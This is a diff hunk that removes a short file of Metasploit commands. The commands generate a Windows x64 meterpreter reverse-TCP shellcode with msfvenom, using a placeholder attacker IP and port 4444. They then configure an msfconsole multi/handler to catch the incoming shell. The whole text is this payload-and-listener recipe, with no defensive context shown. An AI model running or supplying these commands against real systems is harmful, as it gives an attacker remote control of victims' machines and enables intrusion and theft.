@@ -1,8 +1,0 @@
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -f raw -o shellcode.bin
-
-msfconsole
-use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter_reverse_tcp
-set LHOST <YOUR_IP>
-set LPORT 4444
-run
